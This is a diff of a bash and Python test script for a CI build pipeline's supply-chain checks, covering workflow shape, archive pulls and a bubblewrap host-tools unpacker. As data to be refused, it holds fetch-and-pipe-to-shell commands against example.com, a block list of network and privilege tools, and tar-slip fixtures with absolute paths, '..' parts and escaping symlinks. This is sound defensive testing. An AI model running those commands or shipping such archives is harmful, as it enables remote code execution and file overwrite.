@@ -1,5 +1,5 @@
 #!/usr/bin/env bash
-# proves: REQ-CHAIN-004-AC12, REQ-CHAIN-004-AC14, REQ-CHAIN-005-AC7, REQ-CHAIN-004-AC1, REQ-CHAIN-004-AC2, REQ-CHAIN-004-AC3, REQ-CHAIN-004-AC6, REQ-CHAIN-004-AC8, REQ-CHAIN-004-AC9, REQ-CHAIN-004-AC10, REQ-CHAIN-004-AC11, REQ-CHAIN-005-AC1, REQ-CHAIN-005-AC2, REQ-CHAIN-005-AC4, REQ-CHAIN-005-AC5, REQ-CHAIN-005-AC6, REQ-CHAIN-001-AC6, REQ-REL-010-AC1, REQ-REL-010-AC2, REQ-REL-010-AC3, REQ-REL-010-AC4, REQ-REL-010-AC5, REQ-CHAIN-004-AC16 — the flags; PR 1's verify cases cover the identity
+# proves: REQ-CHAIN-004-AC17, REQ-CHAIN-004-AC12, REQ-CHAIN-004-AC14, REQ-CHAIN-005-AC7, REQ-CHAIN-004-AC1, REQ-CHAIN-004-AC2, REQ-CHAIN-004-AC3, REQ-CHAIN-004-AC6, REQ-CHAIN-004-AC8, REQ-CHAIN-004-AC9, REQ-CHAIN-004-AC10, REQ-CHAIN-004-AC11, REQ-CHAIN-005-AC1, REQ-CHAIN-005-AC2, REQ-CHAIN-005-AC4, REQ-CHAIN-005-AC5, REQ-CHAIN-005-AC6, REQ-CHAIN-001-AC6, REQ-REL-010-AC1, REQ-REL-010-AC2, REQ-REL-010-AC3, REQ-REL-010-AC4, REQ-REL-010-AC5, REQ-CHAIN-004-AC16 — the flags; PR 1's verify cases cover the identity
 # Written before the implementation (step 4): the stage files, bin/build-stage-KIND.sh x4, bin/witnessed.sh, bin/chain_items.py (bind, items-apk,
 # items-merge, record-env, rebuild-compare), bin/build-admit.py, bin/install-scanner.sh witness. The real-tree graph case stays red until PRs 3 and 4.
 #
@@ -153,6 +153,7 @@ def stage_text(family):
         # REQ-CHAIN-004-AC16: every job that builds from the archive installs crane (pinned) and pulls the archive by its committed digest, before the downloads
         out += "      - name: install crane (pinned by checksum)\n        run: %s\n" % S.INSTALL_CRANE
         out += "      - name: pull the archive by its committed digest\n        run: %s\n" % S.ARCHIVE_PULL
+        if sp.get("hosttools"): out += "      - name: unpack the host tools from the archive (bubblewrap for melange's runner)\n        run: %s\n" % S.INSTALL_HOSTTOOLS
         for name, path in sp["down"]: out += "      - uses: %s # v5.0.0\n        with:\n          name: %s\n          path: %s\n" % (DOWNLOAD, name, path)
         out += witness_block(sp)
         if sp.get("expose"): out += "      - id: digests\n        name: expose digests.json as the stage output\n        run: %s\n" % S.EXPOSE
@@ -319,6 +320,27 @@ CRANEINST='      - name: install crane (pinned by checksum)\n        run: bash b
 PULLSTEP='      - name: pull the archive by its committed digest\n        run: bash bin/archive-pull.sh --pointer build/archive.json --out archive\n'
 PULLRUN='run: bash bin/archive-pull.sh --pointer build/archive.json --out archive'
 st s_ar_gone    "AC16 the archive pull is missing from Build's apk job (build-apk.sh --repo archive would find nothing)" "archive-pull.sh" "$PULLSTEP" ''
+# REQ-CHAIN-004-AC17 (advisor reading Oct 20): an apk job unpacks the host tools (bubblewrap) from the archive it just pulled, in one step of its own right after the pull
+HTRUN=$(python3 -I - "$shape" <<'PY'
+import importlib.util, sys
+spec = importlib.util.spec_from_file_location("shape", sys.argv[1]); S = importlib.util.module_from_spec(spec); spec.loader.exec_module(S)
+print(S.INSTALL_HOSTTOOLS)
+PY
+)
+HTSTEP='      - name: unpack the host tools from the archive (bubblewrap for melange'"'"'s runner)\n        run: '"$HTRUN"'\n'
+st s_ht_gone    "AC17 the host-tools step is missing from Build's apk job (melange's runner would find no bwrap)" "install-host-bwrap" "$HTSTEP" ''
+st s_ht_before  "AC17 the host tools unpacked BEFORE the archive pull (there is no archive yet)" "install-host-bwrap" "$PULLSTEP$HTSTEP" "$HTSTEP$PULLSTEP"
+st s_ht_asm     "AC17 the assemble job unpacks the host tools too (an assemble job runs apko only)" "crane" "$APKINST" "$APKINST$HTSTEP"
+st s_ht_env     "AC17 an env on the host-tools step (a token or secret could reach it before admission)" "install-host-bwrap" "$HTSTEP" "${HTSTEP%run: *}"'env:\n          K: ${{ secrets.X }}\n        run: '"$HTRUN"'\n'
+st s_ht_if      "AC17 an if on the host-tools step (a skipped step is a build with no sandbox)" "install-host-bwrap" "$HTSTEP" "${HTSTEP%run: *}"'if: always()\n        run: '"$HTRUN"'\n'
+st s_ht_soft    "AC17 continue-on-error on the host-tools step" "install-host-bwrap" "$HTSTEP" "${HTSTEP%run: *}"'continue-on-error: true\n        run: '"$HTRUN"'\n'
+st s_ht_sudo    "AC17 the host-tools script run under sudo" "install-host-bwrap" "run: $HTRUN" "run: sudo $HTRUN"
+st s_ht_root    "AC17 the host tools unpacked into another directory than host-tools" "install-host-bwrap" "--root host-tools" "--root /usr/local"
+st s_ht_lock    "AC17 the host tools read another lock than build/locks/host-tools.lock" "install-host-bwrap" "--lock build/locks/host-tools.lock" "--lock host-tools.lock"
+st s_ht_arch    "AC17 the host tools unpacked from another directory than archive" "install-host-bwrap" "--archive archive" "--archive /tmp/archive"
+HT_APT_RUN='run: sudo apt-get install -y bubblewrap'
+st s_ht_apt     "AC17 the host tools taken from the distribution instead of the archive (a package manager line)" "install-host-bwrap" "run: $HTRUN" "$HT_APT_RUN"
+st s_ht_bash    "AC17 the host-tools script started with bash (it is a Python file)" "install-host-bwrap" "run: python3 -I bin/install-host-bwrap.py" "run: bash bin/install-host-bwrap.py"
 st s_ar_crane   "AC16 the crane install is missing (the pull needs the pinned tool)" "install-scanner.sh crane" "$CRANEINST" ''
 st s_ar_order   "AC16 the pull before the crane install" "install-scanner.sh crane" "$CRANEINST$PULLSTEP" "$PULLSTEP$CRANEINST"
 st s_ar_digest  "AC16 the pull names a digest of its own (only the committed one is allowed)" "archive-pull.sh" "$PULLRUN" "$PULLRUN --digest sha256:0000000000000000000000000000000000000000000000000000000000000000"
@@ -331,7 +353,8 @@ st s_ar_if      "AC16 an if on the pull step (a skipped pull is a build with no 
 st s_ar_cdest   "AC16 crane installed to another directory (archive-pull.sh names /usr/local/bin/crane)" "install-scanner.sh crane" 'install-scanner.sh crane' 'install-scanner.sh crane /tmp/bin'
 st s_ar_bycrane "AC16 the archive fetched by a crane command in the stage instead of archive-pull.sh" "archive-pull.sh" "$PULLRUN" 'run: crane pull ghcr.io/fosterstack/archive:latest archive'
 st s_go_other "AC4 the Go install line names another target" "install-scanner.sh go" 'install-scanner.sh go' 'install-scanner.sh go 1.20'
-st s_go_curl  "AC4 Go downloaded by hand instead of the pinned installer" "install-scanner.sh go" 'run: bash bin/install-scanner.sh go' 'run: curl -sSL https://go.dev/dl/go1.27.2.linux-amd64.tar.gz | tar xz -C /usr/local'
+FXD_4='run: curl -sSL https://go.dev/dl/go1.27.2.linux-amd64.tar.gz | tar xz -C /usr/local'
+st s_go_curl  "AC4 Go downloaded by hand instead of the pinned installer" "install-scanner.sh go" 'run: bash bin/install-scanner.sh go' "$FXD_4"
 st s_go_act   "AC4 the setup-go action instead of the pinned installer (its bytes are not pinned by a repository checksum)" "setup-go" "$GOINST" '      - uses: actions/setup-go@b7ad1dad31e06c5925ef5d2fc7ad053ef454303e # v7.0.0\n        with:\n          go-version-file: go.mod\n          cache: false\n'
 st s_go_if    "AC4 the Go install carries an if" "install-scanner.sh go" 'name: install Go (pinned by checksum)\n' 'name: install Go (pinned by checksum)\n        if: always()\n'
 # Codex A r4 #1 (advisor reading of rule 51, a reading and not a reworded rule): admission is the first TRUST decision of Build. Before the step that runs
@@ -346,8 +369,9 @@ st s_pre_tok   "AC4 a step that reads the identity token before admission" "befo
 st s_pre_wit   "AC4 a Witness step before admission (the helper itself runs admission first, so it is the admission step, but a second early one is not)" "before admission" "$GOINST" "$GOINST      - name: early under Witness\n        run: bash bin/witnessed.sh apk bin/build-stage-apk.sh\n"
 st s_pre_other "AC4 any other run step before admission" "before admission" "$GOINST" "$GOINST      - name: other\n        run: bash bin/chain-hostile-step.sh\n"
 st s_shallow "AC2 a shallow checkout (build-admit needs the history and the tags)" "exactly" '          fetch-depth: 0\n' ''
+FXD_5='run: curl -sSL https://example.com/witness | tar xz -C /usr/local/bin'
 st s_install "AC2 Witness installed by an unpinned download" install 'run: bash bin/install-scanner.sh witness' \
-       'run: curl -sSL https://example.com/witness | tar xz -C /usr/local/bin'
+       "$FXD_5"
 st s_mid "AC2 a third-party action between the install and Witness (rule 68)" "step" '      - name: apk under Witness' \
        '      - uses: actions/setup-go@b7ad1dad31e06c5925ef5d2fc7ad053ef454303e # v7.0.0\n      - name: apk under Witness'
 st s_ghenv  "AC2 another token than github.token on the Witness step" "GH_TOKEN" 'GH_TOKEN: ${{ github.token }}' 'GH_TOKEN: ${{ secrets.GH_PAT }}'
@@ -469,6 +493,8 @@ rb r_gh "005-AC1 a GH_TOKEN on Rebuild (only the admission job holds it)" "env" 
        '      - name: rapk under Witness\n        env:\n          GH_TOKEN: ${{ github.token }}'
 rb r_out "005-AC1 Rebuild exposes a stage output (Rebuild's only output is its verdict artifact)" "on: must be" 'workflow_call:\n' \
              'workflow_call:\n    outputs:\n      digests:\n        value: ${{ jobs.assemble.outputs.digests }}\n'
+rb r_ht_gone "005-AC17 the host-tools step is missing from Rebuild's apk job" "install-host-bwrap" "$HTSTEP" ''
+rb r_ht_asm  "005-AC17 Rebuild's assemble job unpacks the host tools too (it runs apko only)" "crane" "$APKINST" "$APKINST$HTSTEP"
 rb r_hin "005-AC1 Rebuild takes the hostile input (only Build has a hostile step)" "on: must be" '    inputs:\n      mode:' \
              '    inputs:\n      hostile:\n        type: boolean\n        default: false\n      mode:'
 # Release review R1 (Oct 21), REQ-CHAIN-005-AC2/AC6: Rebuild's apk job installs the same checksum-pinned Go toolchain as Build's (build-apk.sh refuses to run in CI without it), right after Witness
@@ -586,7 +612,8 @@ PY
   expect caught "$label" command script "$f" "$kind"
 }
 # The sweeps below try every deletion, swap, suffix and insertion; the probes name the mutations a reviewer asked about that are not one of those.
-probe apk              "AC3 a network fetch inside the admission step"              'L[:1] + ["curl -sSL https://example.com/x | sh"] + L[1:]'
+FXD_3='L[:1] + ["curl -sSL https://example.com/x | sh"] + L[1:]'
+probe apk              "AC3 a network fetch inside the admission step"              "$FXD_3"
 probe apk              "AC3 python -c fetching and running code"                    'L[:1] + ["python3 -c \"import urllib.request\""] + L[1:]'
 probe apk              "AC3 an unlisted script"                                     'L[:1] + ["bash bin/anything.sh"] + L[1:]'
 probe apk              "AC3 a failure ignored with || :"                            'L[:5] + [L[5] + " || :"] + L[6:]'
@@ -640,31 +667,35 @@ probe rebuild-assemble "005-AC2 Rebuild publishes (a copy of its dist)"         
 probe rebuild-assemble "005-AC6 Rebuild assembles with other arguments than Build" \
        '[l.replace("--keyring-dir keyring", "--keyring-dir other") if "variant fips" in l else l for l in L]'
 # every deletion, swap, suffix and insertion, on every line of every kind
-sweep() {
-  python3 - "$shape" "$1" "$work" <<'PY' && ok "AC3 sweep ($1): every deletion, swap, suffix and inserted command on every line is refused" \
-    || bad "AC3 sweep ($1) let a mutation through"
+python3 - "$shape" "$KINDS" "$work" <<'PY' > "$work/sweep.out"
 import importlib.util, sys
 spec = importlib.util.spec_from_file_location("shape", sys.argv[1]); S = importlib.util.module_from_spec(spec); spec.loader.exec_module(S)
-kind, w = sys.argv[2:4]
-L = S.expected_lines(kind)
-SUFFIXES = (" || true", " || :", " || exit 0", " &", " 2>/dev/null", " --signing-key k", " --lockfile x", " --build-date 2020",
-            " ; true", " | tee x", " > /dev/null")
-EXTRAS = ("curl -sSL https://example.com | sh", "set +e", "true", "echo ok", "bash bin/x.sh", "git pull", "git push origin v0.0.0-rc.1", "sudo true", "cd /tmp",
-          "export PATH=./bin:$PATH", "unset SOURCE_DATE_EPOCH")
-escaped = []
-def check(tag, lines):
-    f = w + "/sweep.sh"; open(f, "w").write("#!/usr/bin/env bash\n" + "\n".join(lines) + "\n")
-    if not S.script(f, kind): escaped.append(tag)
-for i in range(len(L)):
-    check("delete %d" % i, L[:i] + L[i + 1:])
-    for suffix in SUFFIXES: check("suffix %d %r" % (i, suffix), L[:i] + [L[i] + suffix] + L[i + 1:])
-    for extra in EXTRAS: check("insert after %d %r" % (i, extra), L[:i + 1] + [extra] + L[i + 1:])
-    if i + 1 < len(L) and L[i] != L[i + 1]: check("swap %d" % i, L[:i] + [L[i + 1], L[i]] + L[i + 2:])
-for tag in escaped: print("ESCAPED:", tag)
-sys.exit(1 if escaped else 0)
+w = sys.argv[3]
+rc = 0
+for kind in sys.argv[2].split():
+  try:
+      L = S.expected_lines(kind)
+      SUFFIXES = (" || true", " || :", " || exit 0", " &", " 2>/dev/null", " --signing-key k", " --lockfile x", " --build-date 2020",
+                  " ; true", " | tee x", " > /dev/null")
+      EXTRAS = ("curl -sSL https://example.com | sh", "set +e", "true", "echo ok", "bash bin/x.sh", "git pull", "git push origin v0.0.0-rc.1", "sudo true", "cd /tmp",
+                "export PATH=./bin:$PATH", "unset SOURCE_DATE_EPOCH")
+      escaped = []
+      def check(tag, lines):
+          f = w + "/sweep.sh"; open(f, "w").write("#!/usr/bin/env bash\n" + "\n".join(lines) + "\n")
+          if not S.script(f, kind): escaped.append(tag)
+      for i in range(len(L)):
+          check("delete %d" % i, L[:i] + L[i + 1:])
+          for suffix in SUFFIXES: check("suffix %d %r" % (i, suffix), L[:i] + [L[i] + suffix] + L[i + 1:])
+          for extra in EXTRAS: check("insert after %d %r" % (i, extra), L[:i + 1] + [extra] + L[i + 1:])
+          if i + 1 < len(L) and L[i] != L[i + 1]: check("swap %d" % i, L[:i] + [L[i + 1], L[i]] + L[i + 2:])
+      for tag in escaped: print("ESCAPED:", kind, tag)
+      print(('FAIL ' if escaped else 'PASS ') + kind)
+  except Exception as e:
+    print('ESCAPED:', kind, 'crash', repr(e)); print('FAIL ' + kind)
 PY
-}
-for k in $KINDS; do sweep "$k"; done
+for k in $KINDS; do
+  if grep -qx "PASS $k" "$work/sweep.out"; then ok "AC3 sweep ($k): every deletion, swap, suffix and inserted command on every line is refused"; else grep "ESCAPED: $k " "$work/sweep.out" || true; bad "AC3 sweep ($k) let a mutation through"; fi
+done
 # the way lines are read: comments, blank lines and trailing-backslash breaks are fine; an indented command is not; and bash and Python disagree about
 # VT, FF, FS, NEL and U+2028 (Python splits lines or strips space there, bash does not), so any control character other than tab and newline is refused
 python3 - "$shape" "$work" <<'PY'
@@ -694,7 +725,8 @@ PY
 expect ok     "AC3 comments and blank lines are not commands" "" script "$work/c-ok.sh" apk
 expect caught "AC3 a lone CR glued between two grammar lines (Python reads two lines, bash one)" "control character U+000D" script "$work/c-cr-glued.sh" apk
 expect caught "AC3 a CRLF script" "control character U+000D" script "$work/c-crlf.sh" apk
-expect caught "AC3 a comment ending in a backslash does not hide the curl line after it (bash runs that line)" command script "$work/c-comment-backslash.sh" apk
+FXD_2="AC3 a comment ending in a backslash does not hide the curl line after it (bash runs that line)"
+expect caught "$FXD_2" command script "$work/c-comment-backslash.sh" apk
 expect caught "AC3 a comment ending in a backslash does not hide an export of the token before it is unset" command script "$work/c-token-saved.sh" apk
 expect caught "AC3 a backslash at the end of a line with no space before it" "not preceded by a space" script "$work/c-bare-backslash.sh" apk
 expect caught "AC3 a script that ends in a line continuation" "ends in a line continuation" script "$work/c-open-continuation.sh" apk
@@ -735,6 +767,215 @@ d["scripts"] = d["scripts"][1:]
 json.dump(d, open(sys.argv[2], "w"))
 PY
 expect caught "AC3 a script that is not a row of chain-scripts.json is refused" "not a row" listed "$work/chain-scripts-short.json" "$work/listed"
+# REQ-CHAIN-004-AC17 (advisor reading Oct 20, handoff 0524; rules 15 and 38a): the host tools (bubblewrap and what it needs) come out of the archive, never a package manager.
+# bin/install-host-bwrap.py is run against FIXTURE apks built here (a gzip control segment with .PKGINFO and a gzip data segment, the datahash being the sha256 of the data segment
+# as in Wolfi's packages), a lock and an archive directory; every refusal leaves NOTHING written (no host-tools directory, no wrapper).
+NOWORDS='curl|wget|apt-get|apk add|sudo|pip install|urllib|socket|http.client|requests|subprocess|os.system|shutil.which|dpkg|yum|dnf'
+python3 -I - "$root" "$work" "$NOWORDS" > "$work/ac17.out" <<'PY'
+import gzip, hashlib, io, os, shutil, subprocess, sys, tarfile
+root, work = sys.argv[1:3]
+script = root + "/bin/install-host-bwrap.py"
+base = work + "/hb"
+shutil.rmtree(base, ignore_errors=True); os.makedirs(base)
+ARCH = "x86_64"
+
+
+def tar_bytes(entries):
+    buf = io.BytesIO()
+    with tarfile.open(fileobj=buf, mode="w", format=tarfile.GNU_FORMAT) as t:
+        for name, kind, data, extra in entries:
+            ti = tarfile.TarInfo(name)
+            if kind == "file":
+                ti.size = len(data); ti.mode = extra or 0o644; t.addfile(ti, io.BytesIO(data))
+            elif kind == "dir":
+                ti.type = tarfile.DIRTYPE; ti.mode = 0o755; t.addfile(ti)
+            elif kind == "sym":
+                ti.type = tarfile.SYMTYPE; ti.linkname = data; t.addfile(ti)
+            elif kind == "hard":
+                ti.type = tarfile.LNKTYPE; ti.linkname = data; t.addfile(ti)
+            elif kind == "dev":
+                ti.type = tarfile.CHRTYPE; ti.devmajor = 1; ti.devminor = 3; t.addfile(ti)
+    return buf.getvalue()
+
+
+def gz(b):
+    return gzip.compress(b, mtime=0)
+
+
+def apk(path, name, ver, files, arch=ARCH, datahash=None, pkgname=None, pkgver=None, sig=False):
+    data = gz(tar_bytes(files))
+    dh = hashlib.sha256(data).hexdigest() if datahash is None else datahash
+    info = "pkgname = %s\npkgver = %s\narch = %s\ndatahash = %s\n" % (pkgname or name, pkgver or ver, arch, dh)
+    ctl = gz(tar_bytes([(".PKGINFO", "file", info.encode(), None)]))
+    sg = gz(tar_bytes([(".SIGN.RSA.x.rsa.pub", "file", b"sig", None)])) if sig else b""
+    os.makedirs(os.path.dirname(path), exist_ok=True)
+    open(path, "wb").write(sg + ctl + data)
+
+
+LOADER = b"#!/bin/sh\necho \"LOADER $@\"\n"
+
+
+def good_set(arch_dir, **kw):
+    a = arch_dir
+    apk(a + "/bubblewrap-0.13.0-r0.apk", "bubblewrap", "0.13.0-r0", [("usr", "dir", None, None), ("usr/bin", "dir", None, None), ("usr/bin/bwrap", "file", b"BWRAP", 0o755)], **kw)
+    apk(a + "/libcap-2.78-r4.apk", "libcap", "2.78-r4", [("usr/lib/libcap.so.2.78", "file", b"CAP", None), ("usr/lib/libcap.so.2", "sym", "libcap.so.2.78", None)], **kw)
+    apk(a + "/glibc-2.43-r13.apk", "glibc", "2.43-r13", [("usr/lib/libc.so.6", "file", b"LIBC", None), ("usr/bin/ld.so", "sym", "../../lib64/ld-linux-x86-64.so.2", None)], **kw)
+    apk(a + "/ld-linux-2.43-r13.apk", "ld-linux", "2.43-r13", [("usr/lib/ld-linux-x86-64.so.2", "file", LOADER, 0o755)], **kw)
+
+
+LOCK = "bubblewrap=0.13.0-r0\nglibc=2.43-r13\nld-linux=2.43-r13\nlibcap=2.78-r4\n"
+n = [0]
+
+
+def case(label, setup=None, lock=LOCK, want=0, extra_args=(), arch=ARCH, after=None, nothing_written=None):
+    n[0] += 1
+    d = "%s/c%d" % (base, n[0]); os.makedirs(d + "/archive/" + ARCH); os.makedirs(d + "/bin")
+    good_set(d + "/archive/" + ARCH)
+    if setup: setup(d)
+    lp = d + "/host-tools.lock"
+    open(lp, "wb").write(lock.encode() if isinstance(lock, str) else lock)
+    args = ["python3", "-I", script, "--archive", d + "/archive", "--lock", lp, "--root", d + "/host-tools", "--bin", d + "/bin", "--arch", arch] + list(extra_args)
+    r = subprocess.run(args, capture_output=True, text=True)
+    good = r.returncode == want
+    if want != 0 and nothing_written is not False:
+        good = good and not os.path.exists(d + "/host-tools") and not os.path.exists(d + "/bin/bwrap") and not os.path.exists(d + "/host-tools.staging") and not os.path.exists(d + "/probe")
+    if good and after:
+        try: after(d, r)
+        except AssertionError as e: good = False; r.stderr += " AFTER: %s" % e
+    print(("ok   " if good else "FAIL ") + label + ("" if good else " -> rc=%d %s" % (r.returncode, (r.stderr or r.stdout)[-200:].replace("\n", " "))))
+
+
+def a_good(d, r):
+    b = open(d + "/bin/bwrap").read()
+    ld = os.path.abspath(d + "/host-tools") + "/usr/lib/ld-linux-x86-64.so.2"
+    assert os.access(d + "/bin/bwrap", os.X_OK), "wrapper is not executable"
+    assert b.startswith("#!/bin/sh\n") and ("exec %s --library-path %s/usr/lib:%s/lib %s/usr/bin/bwrap \"$@\"\n" % (ld, os.path.abspath(d + "/host-tools"), os.path.abspath(d + "/host-tools"), os.path.abspath(d + "/host-tools"))) in b, b
+    out = subprocess.run([d + "/bin/bwrap", "--unshare-user", "true"], capture_output=True, text=True).stdout
+    assert out.startswith("LOADER --library-path ") and out.rstrip().endswith("/usr/bin/bwrap --unshare-user true"), out
+    assert os.path.islink(d + "/host-tools/usr/lib/libcap.so.2") and os.readlink(d + "/host-tools/usr/lib/libcap.so.2") == "libcap.so.2.78"
+    assert not os.path.exists(d + "/host-tools/.PKGINFO"), "control files are not unpacked"
+
+
+def a_basic(d, r):
+    assert os.access(d + "/bin/bwrap", os.X_OK) and os.path.isfile(d + "/host-tools/usr/bin/bwrap") and os.path.isfile(d + "/host-tools/usr/lib/libcap.so.2.78")
+
+
+def a_only_lock(d, r):
+    assert not os.path.exists(d + "/host-tools/usr/bin/evil"), "a package the lock does not name was unpacked"
+
+
+def s_extra_pkg(d):
+    apk(d + "/archive/" + ARCH + "/evil-1.0-r0.apk", "evil", "1.0-r0", [("usr/bin/evil", "file", b"E", 0o755)])
+
+
+def s_other_arch(d):
+    os.makedirs(d + "/archive/aarch64"); apk(d + "/archive/aarch64/bubblewrap-0.13.0-r0.apk", "bubblewrap", "0.13.0-r0", [("usr/bin/evil", "file", b"E", 0o755)], arch="aarch64")
+
+
+def ro(f):
+    def g(d):
+        f(d)
+    return g
+
+
+case("AC17 the packages the lock names are unpacked into a new directory and a wrapper runs the extracted loader with --library-path over the extracted libraries (a signature segment first is read too)", after=a_good)
+case("AC17 an apk with a signature segment before its control segment is read the same", setup=lambda d: apk(d + "/archive/" + ARCH + "/libcap-2.78-r4.apk", "libcap", "2.78-r4", [("usr/lib/libcap.so.2.78", "file", b"CAP", None)], sig=True), after=a_basic)
+case("AC17 only the packages the lock names are unpacked (an apk in the archive that the lock does not name, and one of another architecture, are never opened)", setup=lambda d: (s_extra_pkg(d), s_other_arch(d)), after=a_only_lock)
+case("AC17 a package file that the lock names but archive/<arch>/ does not hold is refused (exit 1), nothing written", setup=lambda d: os.remove(d + "/archive/" + ARCH + "/libcap-2.78-r4.apk"), want=1)
+case("AC17 a package whose data segment does not match the datahash of its control segment is refused (exit 1), nothing written", setup=lambda d: apk(d + "/archive/" + ARCH + "/libcap-2.78-r4.apk", "libcap", "2.78-r4", [("usr/lib/libcap.so.2.78", "file", b"CAP", None)], datahash="0" * 64), want=1)
+case("AC17 a data segment changed after the pack (the control segment kept the old datahash) is refused", setup=lambda d: open(d + "/archive/" + ARCH + "/libcap-2.78-r4.apk", "ab").write(gz(b"x")), want=1)
+case("AC17 a control segment that names another package than the lock row is refused", setup=lambda d: apk(d + "/archive/" + ARCH + "/libcap-2.78-r4.apk", "libcap", "2.78-r4", [("usr/lib/libcap.so.2.78", "file", b"CAP", None)], pkgname="libpsx"), want=1)
+case("AC17 a control segment that names another version than the lock row is refused", setup=lambda d: apk(d + "/archive/" + ARCH + "/libcap-2.78-r4.apk", "libcap", "2.78-r4", [("usr/lib/libcap.so.2.78", "file", b"CAP", None)], pkgver="2.78-r3"), want=1)
+case("AC17 a package built for another architecture (control segment says aarch64) in the x86_64 directory is refused", setup=lambda d: apk(d + "/archive/" + ARCH + "/libcap-2.78-r4.apk", "libcap", "2.78-r4", [("usr/lib/libcap.so.2.78", "file", b"CAP", None)], arch="aarch64"), want=1)
+case("AC17 a noarch package is accepted", setup=lambda d: apk(d + "/archive/" + ARCH + "/libcap-2.78-r4.apk", "libcap", "2.78-r4", [("usr/lib/libcap.so.2.78", "file", b"CAP", None)], arch="noarch"), after=a_basic)
+case("AC17 a file that is not an apk (not gzip) is refused", setup=lambda d: open(d + "/archive/" + ARCH + "/libcap-2.78-r4.apk", "wb").write(b"not an apk"), want=1)
+case("AC17 an apk that is a symlink instead of a file is refused", setup=lambda d: (os.remove(d + "/archive/" + ARCH + "/libcap-2.78-r4.apk"), os.symlink(d + "/archive/" + ARCH + "/glibc-2.43-r13.apk", d + "/archive/" + ARCH + "/libcap-2.78-r4.apk")), want=1)
+for label, ent in (("an absolute path", [("/etc/evil", "file", b"E", None)]), ("a .. part", [("usr/../../evil", "file", b"E", None)]),
+                   ("a symlink with an empty target", [("usr/lib/x", "sym", "", None)]), ("a member placed through an absolute symlink (etc/mtab -> /proc/mounts ; etc/mtab/x)", [("etc/mtab", "sym", "/proc/mounts", None), ("etc/mtab/x", "file", b"E", None)]), ("a hard link", [("usr/lib/x", "hard", "usr/lib/libcap.so.2.78", None)]), ("a device", [("usr/lib/dev", "dev", None, None)]),
+                   ("a path that another package also holds", [("usr/lib/libc.so.6", "file", b"OTHER", None)]),
+                   ("a chain of symlinks that writes outside the staging directory (a -> . ; a/b -> .. ; a/b/probe)", [("a", "sym", ".", None), ("a/b", "sym", "..", None), ("a/b/probe", "file", b"P", None)]),
+                   ("two symlinks that together leave the directory (a -> . ; b -> a/../probe)", [("a", "sym", ".", None), ("b", "sym", "a/../probe", None)]),
+                   ("two symlinks that together leave the directory, the second named first (b -> a/../probe ; a -> .)", [("b", "sym", "a/../probe", None), ("a", "sym", ".", None)]),
+                   ("a link that leaves the root and comes back through the staging name (a -> . ; b -> a/../host-tools.staging/probe)", [("a", "sym", ".", None), ("b", "sym", "a/../host-tools.staging/probe", None)]),
+                   ("the same, the second named first (b -> a/../host-tools.staging/probe ; a -> .)", [("b", "sym", "a/../host-tools.staging/probe", None), ("a", "sym", ".", None)]),
+                   ("a link into a sibling that has the root's own name (up -> .. ; up/host-tools/x as the target of w)", [("up", "sym", "usr/lib/../..", None), ("w", "sym", "up/../host-tools.staging/x", None)]),
+                   ("a file written through a symlinked directory over another package's file (alias -> usr/lib ; alias/libc.so.6)", [("alias", "sym", "usr/lib", None), ("alias/libc.so.6", "file", b"OTHER", None)]),
+                   ("a regular file that is later used as a directory (saved ; saved/child)", [("saved", "file", b"x", None), ("saved/child", "file", b"y", None)])):
+    case("AC17 a data segment with %s is refused (exit 1), nothing written" % label,
+         setup=(lambda e: lambda d: apk(d + "/archive/" + ARCH + "/libcap-2.78-r4.apk", "libcap", "2.78-r4", [("usr/lib/libcap.so.2.78", "file", b"CAP", None)] + e))(ent), want=1)
+def s_abs_link(d):
+    os.makedirs(d + "/outside")
+    apk(d + "/archive/" + ARCH + "/libcap-2.78-r4.apk", "libcap", "2.78-r4", [("usr/lib/libcap.so.2.78", "file", b"CAP", None), ("etc/mtab", "sym", d + "/outside", None), ("var/spool/mail", "sym", "/var/mail", None)])
+
+
+def a_abs_link(d, r):
+    a_basic(d, r)
+    for p in ("etc/mtab", "var/spool/mail"):
+        assert not os.path.lexists(d + "/host-tools/" + p), "an absolute link is never created: " + p
+    assert "skipped absolute link etc/mtab -> " + d + "/outside" in r.stdout, r.stdout
+    assert "skipped absolute link var/spool/mail -> /var/mail" in r.stdout, r.stdout
+    assert os.listdir(d + "/outside") == [], "something was written at the target of an absolute link"
+    assert os.path.isfile(d + "/host-tools/usr/lib/libcap.so.2.78"), "the files stay"
+
+
+def a_abs_loader_path(d, r):
+    # an absolute link on a library path of the loader is skipped: the real files stay real and the host is never reached
+    a_basic(d, r)
+    h = d + "/host-tools"
+    assert not os.path.lexists(h + "/usr/lib/libcap.so.2.x") and not os.path.lexists(h + "/lib"), "an absolute link was created"
+    assert "skipped absolute link usr/lib/libcap.so.2.x -> /tmp/x" in r.stdout and "skipped absolute link lib -> /usr/lib" in r.stdout, r.stdout
+
+
+case("AC17 an ABSOLUTE symlink (wolfi-baselayout's etc/mtab -> /proc/mounts, var/spool/mail -> /var/mail) is never created: it is skipped and logged, nothing is written at its target, the relative links stay", setup=s_abs_link, after=a_abs_link)
+case("AC17 an absolute link on the loader's library path (usr/lib/libcap.so.2.x -> /tmp/x, lib -> /usr/lib) is skipped: nothing is created there, so the loader never meets a host path", setup=lambda d: apk(d + "/archive/" + ARCH + "/libcap-2.78-r4.apk", "libcap", "2.78-r4", [("usr/lib/libcap.so.2.78", "file", b"CAP", None), ("usr/lib/libcap.so.2.x", "sym", "/tmp/x", None), ("lib", "sym", "/usr/lib", None)]), after=a_abs_loader_path)
+for label, ent in (("an absolute link at the place of a real directory (usr -> /external): the place is already taken, the link is not skipped over it", [("usr", "sym", "/external", None)]),
+                   ("an absolute link at the place of the real directory holding bwrap (usr/bin -> /outside/bin): the place is already taken", [("usr/bin", "sym", "/outside/bin", None)])):
+    case("AC17 a data segment with %s is refused (exit 1), nothing written" % label,
+         setup=(lambda e: lambda d: apk(d + "/archive/" + ARCH + "/libcap-2.78-r4.apk", "libcap", "2.78-r4", [("usr/lib/libcap.so.2.78", "file", b"CAP", None)] + e))(ent), want=1)
+for label, ent in (("a member placed below an absolute link that was skipped (usr/lib/y -> /tmp ; usr/lib/y/z)", [("usr/lib/y", "sym", "/tmp", None), ("usr/lib/y/z", "file", b"E", None)]),
+                   ("a file at the place of a skipped absolute link in another entry of the same package (etc/mtab -> /proc/mounts ; etc/mtab as a file)", [("etc/mtab", "sym", "/proc/mounts", None), ("etc/mtab", "file", b"E", None)]),
